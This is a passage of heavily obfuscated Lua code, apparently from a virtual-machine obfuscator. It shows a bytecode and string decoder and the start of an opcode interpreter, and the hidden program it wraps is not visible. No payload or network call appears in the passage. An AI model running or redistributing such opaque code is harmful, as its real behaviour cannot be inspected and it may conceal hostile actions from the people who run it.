bw),ca,cc))end,function(y,bf,bh,bi)if(cw>be)then local be=cv while true do be=be+ct if be<cs then return bi else break end end end cw=cw+ct cx=((cx+x)%w)if((cx%s)>v or(cx%s)==v)then local s=cv while true do s=(s+ct)if(s<ct or s==ct)then cx=((cx-bz)%q)else if not(s~=bg)then break else return bi end end end else local q=cv while true do q=(q+ct)if not(q~=cs)then break else return bh(y(bh,(y and bh),bf,bi),(bi(bh,y,bf,bh)and bf(bi,bi and bh,bf,bh and bi)),bh(bf,bh,y,bh),bf(bf,bi,bf,bf))end end end return y(bh(bf and bi,bf,bf and y,(bi and bh)),bi(y,bh,bi,bh),bi(bi and bh,(bh and bh),bf,bh),y(bh,bi,bf,bi))end,function(q,s,v,w)if cw>p then local p=cv while true do p=p+ct if p<cs then return w else break end end end cw=cw+ct cx=(cx*d)%c if((cx%b)>a)then local a=cv while true do a=a+ct if(a<cs)then return q(v(w,q,q,(s and v)),q(q,v,s,(s and q))and w(s,w,w,s),s(q,w,q,(v and q)),v(q,v,q,v)and q(s,v,q,(q and w)))else break end end else local a=cv while true do a=a+ct if not(a~=cs)then break else return s end end end return w end)return cx;end)()));else ck=function()local a,b,c,d,p,q,s=0 while true do if a<=3 then if a<=1 then if 1>a then b,c=cf(),cf()else if b==0 and not(c~=0)then return 0;end;end else if 3~=a then d=1 else p=(((cd(c,1,20)*((2^32))))+b)end end else if a<=5 then if 4<a then s=((-1)^cd(c,32))else q=cd(c,21,31)end else if a<=6 then if(not(q~=0))then if(p==0)then return(s*0);else q=1;d=0;end;elseif((q==2047))then if(p==0)then return(s*(1/0));else return s*(0/0);end;end;else if 8~=a then return s*2^(q-1023)*(d+(p/(2^52)))else break end end end end a=a+1 end end end else if bd<=29 then cl="\46"else if 30==bd then cm=function()local a,b,c=0 while true do if a<=1 then if a==0 then b,c=h(bn,br,(br+2))else b,c=bu(b,cb),bu(c,cb);end else if a<=2 then br=(br+2);else if 3==a then return(bv(c,8))+b;else break end end end a=a+1 end end else cn=cf end end end else if bd<=33 then if bd<33 then co=function()local a,b,c,d,p=0 while true do if a<=2 then if a<=0 then b=g else if 2>a then c=157 else d=0 end end else if a<=3 then p={}else if a>4 then break else while d<8 do d=(d+1);while d<707 and c%1622<811 do c=((c*35))local q=(d+c)if((c%16522)<8261)then c=(c*19)while(((d<828)and c%658<329))do c=(((c+60)))local q=(d+c)if(((c%18428))==9214 or((c%18428))<9214)then c=((c-50))local q=10701 if not p[q]then p[q]=1;local q,s=cn(),g;if not(q~=0)then return g;end;b=j(bn,br,(((br+q)-1)));br=((br+q));return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if s==1 then while true do if 0<v then break else return i(h(q))end v=(v+1)end else break end end s=s+1 end end);end elseif((c%4~=0))then c=(c-67)local q=33140 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if 2>s then while true do if not(v==1)then return i(h(q))else break end v=v+1 end else break end end s=s+1 end end);end else c=(c*88)d=d+1 local q=92657 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if s~=2 then while true do if(1>v)then return i(h(q))else break end v=(v+1)end else break end end s=s+1 end end);end end;d=((d+1));end elseif not(not(c%4~=0))then c=(c-48)while(((d<859)and(c%1392)<696))do c=(c*39)local q=(d+c)if(c%58)<29 then c=((c+5))local q=33930 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if 2>s then while true do if(v>0)then break else return i(h(q))end v=(v+1)end else break end end s=s+1 end end);end elseif not((c%4==0))then c=(c*56)local q=35370 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if s~=2 then while true do if v>0 then break else return i(h(q))end v=v+1 end else break end end s=s+1 end end);end else c=((c*9))d=(d+1)local q=96267 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if s==1 then while true do if 1~=v then return i(h(q))else break end v=v+1 end else break end end s=s+1 end end);end end;d=(d+1);end else c=((c-51))d=((d+1))while(d<663)and(((c%936)<468))do c=((c*12))local q=(d+c)if((c%18532)>=9266)then c=(c*71)local q=7037 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if 2~=s then while true do if(v>0)then break else return i(h(q))end v=v+1 end else break end end s=s+1 end end);end elseif not(not(c%4~=0))then c=(c-18)local q=90882 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if 2~=s then while true do if not(1==v)then return i(h(q))else break end v=(v+1)end else break end end s=s+1 end end);end else c=((c*35))d=((d+1))local q=41573 if not p[q]then p[q]=1;return z(b,cl,function(b)local p,q=0 while true do if p<=0 then q=0 else if p>1 then break else while true do if q==0 then return i(h(b))else break end q=q+1 end end end p=p+1 end end);end end;d=d+1;end end;d=d+1;end c=((c-494))if(d>43)then break;end;end;end end end a=a+1 end end else cp=cf end else if bd<=34 then cq=function(...)local a=0 while true do if a~=1 then return{...},n("\35",...)else break end a=a+1 end end else if bd<36 then cr=function()local a,b,c,d,p,q,s,v,w,x=0 while true do if a<=9 then if a<=4 then if a<=1 then if 1~=a then b,c,d,p={},{},{},{}else q=m({[ch]=b,nil,[ci]=c,nil,[776]=p,[345]=bb,[536]=nil},{['\95\95\116\111\115\116\114\105\110\103']=function(...)return j(bn,br,br);end,})end else if a<=2 then s={}else if 3==a then v=490 else w=0 end end end else if a<=6 then if 6~=a then x={}else while w<3 do w=(w+1);while((w<481 and(v%320<160)))do v=((v*62))local d=(w+v)if(v%916)>458 then v=(((v-88)))while(((w<318))and v%702<351)do v=(((v*8)))local d=(w+v)if(((v%14064))>7032)then v=((v*81))local d=58084 if not x[d]then x[d]=1;s[cf()]=nil;end elseif not((v%4)==0)then v=(v*37)local d=93269 if not x[d]then x[d]=1;s[cf()]=nil;end else v=((v+10))w=(w+1)local d=78058 if not x[d]then x[d]=1;for d=1,cf()do local j=cg();if(not(not(j==2)))then s[d]=nil;elseif(not(not(j==1)))then s[d]=(not((cg()==0)));elseif(((j==0)))then s[d]=ck();elseif(not(not(j==3)))then s[d]=co();end;end;q[cj]=s;end end;w=(w+1);end elseif not(not(((v%4))~=0))then v=((v*65))while((w<615)and((v%618)<309))do v=(v-33)local d=w+v if(((v%15582)>7791))then v=(((v*14)))local d=31092 if not x[d]then x[d]=1;s[cf()]=nil;end elseif not(v%4==0)then v=(((v+51)))local d=68285 if not x[d]then x[d]=1;s[cf()]=nil;end else v=((v+53))w=((w+1))local d=64266 if not x[d]then x[d]=1;s[cf()]=nil;end end;w=(w+1);end else v=((v+7))w=w+1 while(w<127 and v%1548<774)do v=((v-37))local d=((w+v))if(((v%19188)>9594))then v=(((v*61)))local d=73351 if not x[d]then x[d]=1;s[cf()]=nil;end elseif not((v%4==0))then v=((v+25))local d=78934 if not x[d]then x[d]=1;s[cf()]=nil;end else v=((v+42))w=(w+1)local d=62692 if not x[d]then x[d]=1;s[cf()]=nil;end end;w=(w+1);end end;w=(w+1);end v=((v*482))if(w>56)then break;end;end;end else if a<=7 then for d=1,cf()do c[(d-1)]=cr();end;else if a~=9 then v=511 else w=0 end end end end else if a<=14 then if a<=11 then if a>10 then while(w<5)do w=(w+1);while((w<233 and v%672<336))do v=(((v+93)))local c=(w+v)if((v%12736)>=6368)then v=((v*56))while(w<220)and v%1744<872 do v=((v+18))local c=((w+v))if(((v%1462)==731 or(v%1462)>731))then v=(v*69)local c=51867 if not x[c]then x[c]=1;end elseif not(not(v%4~=0))then v=((v+63))local c=78847 if not x[c]then x[c]=1;end else v=(((v*84)))w=(w+1)local c=96974 if not x[c]then x[c]=1;end end;w=w+1;end elseif not(not(v%4~=0))then v=(v-56)while(w<988 and v%62<31)do v=(((v-9)))local c=w+v if(((((v%14160)))<7080))then v=(((v*80)))local c=65446 if not x[c]then x[c]=1;local c=1;local d=2;local j=3;local p=4;for p=1,cf()do local y=cg();local bb=cd(y,c,c);if((bb==0))then local y,bb,be=cd(y,d,j),cd(y,4,6),m({[343]=cm(),[548]=cm(),nil,nil},{['\95\95\116\111\115\116\114\105\110\103']=function(...)return cd(y,d,j);end,})if((((y==0)or(y==c))))then be[613]=cf();if(not(not(y==0)))then be[554]=cf();end;elseif((y==d)or(y==j))then be[613]=(((cf()-(e))));if(not(not(y==j)))then be[554]=cm();end;end;if(not(not(cd(bb,c,c)==c)))then be[548]=s[be[548]];end;if(not(not(cd(bb,d,d)==c)))then be[613]=s[be[613]];end;if(not(not(cd(bb,j,j)==c)))then be[554]=s[be[554]];end;b[p]=be;end;end;end elseif not((v%4==0))then v=(((v+27)))local b=54459 if not x[b]then x[b]=1;end else v=((v-94))w=((w+1))local b=96087 if not x[b]then x[b]=1;end end;w=(w+1);end else v=((v+39))w=(w+1)while w<288 and v%1980<990 do v=((v*10))local b=(w+v)if(((v%3544)==1772 or(v%3544)<1772))then v=(((v*68)))local b=39029 if not x[b]then x[b]=1;end elseif v%4~=0 then v=((v-87))local b=10849 if not x[b]then x[b]=1;end else v=((v+79))w=(w+1)local b=28571 if not x[b]then x[b]=1;end end;w=((w+1));end end;w=w+1;end v=((v*563))if(w>97)then break;end;end;else x={}end else if a<=12 then q[481]=cg();else if 14~=a then do for b=1,#q[ch]do local b=q[ch][b]local c,d,e=b[548],b[613],b[554]if not(not(bp(c)==f))then c=z(c,cl,function(j,p)local p,s=0 while true do if p<=0 then s=0 else if p<2 then while true do if not(s==1)then return i(bu(h(j),cb))else break end s=(s+1)end else break end end p=p+1 end end)b[548]=c end if(not((bp(d)~=f)))then d=z(d,cl,function(c,j,j)local j,p=0 while true do if j<=0 then p=0 else if j>1 then break else while true do if p==0 then return i(bu(h(c),cb))else break end p=p+1 end end end j=j+1 end end)b[613]=d end if not(bp(e)~=f)then e=z(e,cl,function(c,d)local d,j=0 while true do if d<=0 then j=0 else if 1<d then break else while true do if not(j~=0)then return i(bu(h(c),cb))else break end j=j+1 end end end d=d+1 end end)b[554]=e end;end;q[cj]=nil;end;else v=520 end end end else if a<=16 then if a<16 then w=0 else x={}end else if a<=17 then while(w<3)do w=w+1;while(w<833 and v%836<418)do v=((v+86))local b=((w+v))if((v%1222)<611)then v=((v+75))while(w<729 and(v%882<441))do v=(((v*1)))local b=w+v if((v%13190)<6595)then v=((v+44))local b=25100 if not x[b]then x[b]=1;return q end elseif not(not((v%4)~=0))then v=((v*71))local b=1331 if not x[b]then x[b]=1;q[536]=function(...)local b,c,d,e,h=0 while true do if b<=0 then c,d,e,h=0 else if 1<b then break else while true do if(c<2 or c==2)then if(c<=0)then d=n(1,...)else if(1==c)then e=({...})else do for d=0,#e do if(not(bp(e[d])~=bq))then for i,i in o,e[d]do if not(bp(i)~=bp(g))then t(bo,i)end end else t(bo,e[d])end end end end end else if(c==3 or c<3)then h=function(d)local i,j,p=0 while true do if i<=0 then j,p=0 else if i>1 then break else while true do if(j<=1)then if(1>j)then p=u(d)else for p=0,#bo do if ba(d,bo[p])then return bm(f);end end end else if j>2 then break else return false end end j=(j+1)end end end i=i+1 end end else if(4<c)then break else for d=0,#e do if(not(bp(e[d])~=bq))then return h(e[d])end end end end end c=c+1 end end end b=b+1 end end end else v=(((v-80)))w=w+1 local b=37197 if not x[b]then x[b]=1;return q end end;w=((w+1));end elseif not(((v%4)==0))then v=((v*33))while(w<614)and((v%208)<104)do v=(((v+62)))local b=((w+v))if((((v%9116))>4558))then v=(v+95)local b=97485 if not x[b]then x[b]=1;return q end elseif not(v%4==0)then v=((v*62))local b=6185 if not x[b]then x[b]=1;return q end else v=(((v-79)))w=w+1 local b=91079 if not x[b]then x[b]=1;return q end end;w=((w+1));end else v=(((v-61)))w=w+1 while((w<349)and((v%1494)<747))do v=(v+9)local b=(w+v)if(v%28)>=14 then v=((v+11))local b=26310 if not x[b]then x[b]=1;return q end elseif(not(v%4==0))then v=((v*98))local b=66681 if not x[b]then x[b]=1;return q end else v=((v-18))w=(w+1)local b=22253 if not x[b]then x[b]=1;return q end end;w=w+1;end end;w=(w+1);end v=(v*219)if(w>98)then break;end;end;else if 19>a then return q;else break end end end end end a=a+1 end end else break end end end end end end bd=bd+1 end local function a(b,c)local d if bp(l)==bq then d=l;else d=l(bl);end local e={}for f,h in o,d do if h~=b then e[f]=h else e[f]=c;end end if bc then return bc(bl,e)else l=e;return l;end end;local function b(...)local c=n(bl,...);local d=c[ci];local e=c[536];local f=c[ch];local h=n(2,...);local i=c[345];local j=n(3,...);local o=c[481];local c=c[776];local c=bt[ba(bx,i)];return function(...)local i,n,p,q,s,u,v,w=cq,1,-1,{},{...},(n("\35",...)-1),{},{};for x=0,u,1 do if(x>=o)then q[x-o]=s[x+1];else w[x]=s[x+1];end;end;local x,y,z,ba=(u-o+1),nil,nil,{};while true do y=f[n];z=y[343];if z<=192 then if z<=95 then if z<=47 then if z<=23 then if z<=11 then if z<=5 then if(2>=z)then if(0==z or 0>z)then local ba,bb=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if ba~=1 then bb=nil else w[y[548]]=w[y[613]];end else if ba<3 then n=n+1;else y=f[n];end end else if ba<=5 then if ba<5 then w[y[548]]=y[613];else n=n+1;end else if 7~=ba then y=f[n];else w[y[548]]=y[613];end end end else if ba<=11 then if ba<=9 then if ba~=9 then n=n+1;else y=f[n];end else if ba~=11 then w[y[548]]=y[613];else n=n+1;end end else if ba<=13 then if 13>ba then y=f[n];else bb=y[548]end else if ba<15 then w[bb]=w[bb](r(w,bb+1,y[613]))else break end end end end ba=ba+1 end elseif z>1 then local ba,bb,bc,bd=0 while true do if ba<=10 then if ba<=4 then if ba<=1 then if ba~=1 then bb=nil else bc=nil end else if ba<=2 then bd=nil else if ba<4 then w[y[548]]=h[y[613]];else n=n+1;end end end else if ba<=7 then if ba<=5 then y=f[n];else if ba<7 then w[y[548]]=w[y[613]][y[554]];else n=n+1;end end else if ba<=8 then y=f[n];else if ba==9 then w[y[548]]=w[y[613]][y[554]];else n=n+1;end end end end else if ba<=16 then if ba<=13 then if ba<=11 then y=f[n];else if 12==ba then w[y[548]]=h[y[613]];else n=n+1;end end else if ba<=14 then y=f[n];else if ba<16 then w[y[548]]=w[y[613]][y[554]];else n=n+1;end end end else if ba<=19 then if ba<=17 then y=f[n];else if 18<ba then bc=y[554];else bd=y[613];end end else if ba<=20 then bb=k(w,g,bd,bc);else if 22~=ba then w[y[548]]=bb;else break end end end end end ba=ba+1 end else local ba,bb=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if 1~=ba then bb=nil else w[y[548]]=h[y[613]];end else if ba>2 then y=f[n];else n=n+1;end end else if ba<=5 then if 5~=ba then w[y[548]]=y[613];else n=n+1;end else if 6==ba then y=f[n];else w[y[548]]=y[613];end end end else if ba<=11 then if ba<=9 then if ba>8 then y=f[n];else n=n+1;end else if ba==10 then w[y[548]]=y[613];else n=n+1;end end else if ba<=13 then if ba>12 then bb=y[548]else y=f[n];end else if ba>14 then break else w[bb]=w[bb](r(w,bb+1,y[613]))end end end end ba=ba+1 end end;elseif(3>=z)then local ba,bb=0 while true do if ba<=10 then if ba<=4 then if ba<=1 then if 1~=ba then bb=nil else w[y[548]]=j[y[613]];end else if ba<=2 then n=n+1;else if ba<4 then y=f[n];else w[y[548]]=w[y[613]][y[554]];end end end else if ba<=7 then if ba<=5 then n=n+1;else if 7~=ba then y=f[n];else w[y[548]]=y[613];end end else if ba<=8 then n=n+1;else if 10~=ba then y=f[n];else w[y[548]]=y[613];end end end end else if ba<=15 then if ba<=12 then if ba~=12 then n=n+1;else y=f[n];end else if ba<=13 then w[y[548]]=y[613];else if 15>ba then n=n+1;else y=f[n];end end end else if ba<=18 then if ba<=16 then w[y[548]]=y[613];else if ba==17 then n=n+1;else y=f[n];end end else if ba<=19 then bb=y[548]else if ba~=21 then w[bb]=w[bb](r(w,bb+1,y[613]))else break end end end end end ba=ba+1 end elseif(5>z)then local ba,bb=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if ba~=1 then bb=nil else w[y[548]]=h[y[613]];end else if ba<3 then n=n+1;else y=f[n];end end else if ba<=5 then if 4<ba then n=n+1;else w[y[548]]=w[y[613]][y[554]];end else if ba<7 then y=f[n];else w[y[548]]=y[613];end end end else if ba<=11 then if ba<=9 then if ba>8 then y=f[n];else n=n+1;end else if ba>10 then n=n+1;else w[y[548]]=y[613];end end else if ba<=13 then if 12==ba then y=f[n];else bb=y[548]end else if 15~=ba then w[bb]=w[bb](r(w,bb+1,y[613]))else break end end end end ba=ba+1 end else w[y[548]]=(w[y[613]]*y[554]);end;elseif z<=8 then if 6>=z then w[y[548]]=w[y[613]];elseif 7==z then local ba=y[548]w[ba](r(w,ba+1,y[613]))else local ba;local bb;w[y[548]]={};n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]={};n=n+1;y=f[n];w[y[548]]={};n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]][y[613]]=w[y[554]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]][y[613]]=w[y[554]];n=n+1;y=f[n];w[y[548]][y[613]]=w[y[554]];n=n+1;y=f[n];w[y[548]]={r({},1,y[613])};n=n+1;y=f[n];w[y[548]]=w[y[613]];n=n+1;y=f[n];bb=y[548];ba=w[bb];for bc=bb+1,y[613]do t(ba,w[bc])end;end;elseif 9>=z then local ba=d[y[613]];local bb={};local bc={};for bd=1,y[554]do n=n+1;local be=f[n];if be[343]==6 then bc[bd-1]={w,be[613]};else bc[bd-1]={h,be[613]};end;v[#v+1]=bc;end;m(bb,{['\95\95\105\110\100\101\120']=function(bd,bd)local bd=bc[bd];return bd[1][bd[2]];end,['\95\95\110\101\119\105\110\100\101\120']=function(bd,bd,be)local bc=bc[bd]bc[1][bc[2]]=be;end;});w[y[548]]=b(ba,bb,j);elseif z>10 then w[y[548]]=j[y[613]];else local ba=y[548]w[ba]=w[ba](w[ba+1])end;elseif z<=17 then if 14>=z then if 12>=z then w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]][y[613]]=w[y[554]];n=n+1;y=f[n];n=y[613];elseif 13==z then local ba;local bb;local bc;w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][w[y[554]]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];bc=y[613];bb=y[554];ba=k(w,g,bc,bb);w[y[548]]=ba;else local ba;local bb;local bc;w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][w[y[554]]];n=n+1;y=f[n];bc=y[548]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[554]do ba=ba+1;w[bd]=bb[ba];end end;elseif z<=15 then w[y[548]]=w[y[613]]-w[y[554]];elseif z==16 then w={};for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]]+y[554];n=n+1;y=f[n];h[y[613]]=w[y[548]];n=n+1;y=f[n];do return end;n=n+1;y=f[n];do return end;else local ba;w[y[548]]={};n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]][y[613]]=w[y[554]];n=n+1;y=f[n];w[y[548]]=j[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=j[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];ba=y[548]w[ba]=w[ba]()end;elseif z<=20 then if 18>=z then local ba;local bb;local bc;w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][w[y[554]]];n=n+1;y=f[n];bc=y[548]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[554]do ba=ba+1;w[bd]=bb[ba];end elseif 19<z then w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][w[y[554]]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];else local ba;w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=false;n=n+1;y=f[n];ba=y[548]w[ba](w[ba+1])end;elseif 21>=z then local ba,bb=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if 1~=ba then bb=nil else w[y[548]]=h[y[613]];end else if ba==2 then n=n+1;else y=f[n];end end else if ba<=5 then if ba<5 then w[y[548]]=y[613];else n=n+1;end else if 6<ba then w[y[548]]=y[613];else y=f[n];end end end else if ba<=11 then if ba<=9 then if ba<9 then n=n+1;else y=f[n];end else if ba~=11 then w[y[548]]=y[613];else n=n+1;end end else if ba<=13 then if 12==ba then y=f[n];else bb=y[548]end else if 14<ba then break else w[bb]=w[bb](r(w,bb+1,y[613]))end end end end ba=ba+1 end elseif 23~=z then local ba;w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];ba=y[548]w[ba]=w[ba](w[ba+1])else w={};for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]={};n=n+1;y=f[n];w[y[548]]={};n=n+1;y=f[n];w[y[548]][y[613]]=w[y[554]];n=n+1;y=f[n];w[y[548]]=j[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];if w[y[548]]then n=n+1;else n=y[613];end;end;elseif z<=35 then if z<=29 then if 26>=z then if z<=24 then w[y[548]]=w[y[613]]-y[554];elseif 26>z then w[y[548]][y[613]]=y[554];else local ba;w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]]*y[554];n=n+1;y=f[n];w[y[548]]=w[y[613]]+w[y[554]];n=n+1;y=f[n];w[y[548]]=j[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]]+w[y[554]];n=n+1;y=f[n];ba=y[548]w[ba]=w[ba](r(w,ba+1,y[613]))end;elseif z<=27 then w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];if w[y[548]]then n=n+1;else n=y[613];end;elseif 29>z then local ba=y[548];do return r(w,ba,p)end;else local ba;w[y[548]]=j[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];ba=y[548]w[ba]=w[ba](r(w,ba+1,y[613]))end;elseif 32>=z then if 30>=z then local ba;w[y[548]]=w[y[613]];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];ba=y[548]w[ba]=w[ba](r(w,ba+1,y[613]))elseif 31<z then local ba;local bb;local bc;w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][w[y[554]]];n=n+1;y=f[n];bc=y[548]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[554]do ba=ba+1;w[bd]=bb[ba];end else local ba;local bb;local bc;w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][w[y[554]]];n=n+1;y=f[n];bc=y[548]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[554]do ba=ba+1;w[bd]=bb[ba];end end;elseif 33>=z then w[y[548]]={};elseif z>34 then w[y[548]]=w[y[613]]-w[y[554]];else local ba;w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]={};n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]={};n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];ba=y[548]w[ba]=w[ba]()end;elseif 41>=z then if z<=38 then if z<=36 then local ba;local bb,bc;local bd;w[y[548]]=w[y[613]][w[y[554]]];n=n+1;y=f[n];w[y[548]]=w[y[613]];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];bd=y[548]bb,bc=i(w[bd](r(w,bd+1,y[613])))p=bc+bd-1 ba=0;for bc=bd,p do ba=ba+1;w[bc]=bb[ba];end;elseif 38>z then local ba;local bb;local bc;w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][w[y[554]]];n=n+1;y=f[n];bc=y[548]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[554]do ba=ba+1;w[bd]=bb[ba];end else if w[y[548]]then n=n+1;else n=y[613];end;end;elseif 39>=z then local ba,bb=0 while true do if ba<=10 then if ba<=4 then if ba<=1 then if 0==ba then bb=nil else w[y[548]]=j[y[613]];end else if ba<=2 then n=n+1;else if 4~=ba then y=f[n];else w[y[548]]=w[y[613]][y[554]];end end end else if ba<=7 then if ba<=5 then n=n+1;else if ba>6 then w[y[548]]=y[613];else y=f[n];end end else if ba<=8 then n=n+1;else if ba>9 then w[y[548]]=y[613];else y=f[n];end end end end else if ba<=15 then if ba<=12 then if ba==11 then n=n+1;else y=f[n];end else if ba<=13 then w[y[548]]=y[613];else if ba<15 then n=n+1;else y=f[n];end end end else if ba<=18 then if ba<=16 then w[y[548]]=y[613];else if ba~=18 then n=n+1;else y=f[n];end end else if ba<=19 then bb=y[548]else if ba<21 then w[bb]=w[bb](r(w,bb+1,y[613]))else break end end end end end ba=ba+1 end elseif 40<z then local ba;w[y[548]]=w[y[613]];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];ba=y[548]w[ba]=w[ba](r(w,ba+1,y[613]))else local ba;w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][w[y[554]]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];ba=y[548]w[ba]=w[ba](r(w,ba+1,y[613]))end;elseif 44>=z then if z<=42 then local ba=y[548];local bb=w[y[613]];w[ba+1]=bb;w[ba]=bb[y[554]];elseif 43<z then if(w[y[548]]<=w[y[554]])then n=y[613];else n=n+1;end;else local ba;w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];ba=y[548]w[ba]=w[ba](r(w,ba+1,y[613]))end;elseif z<=45 then local ba;w={};for bb=0,u,1 do if bb<o then w[bb]=s[bb+1];else 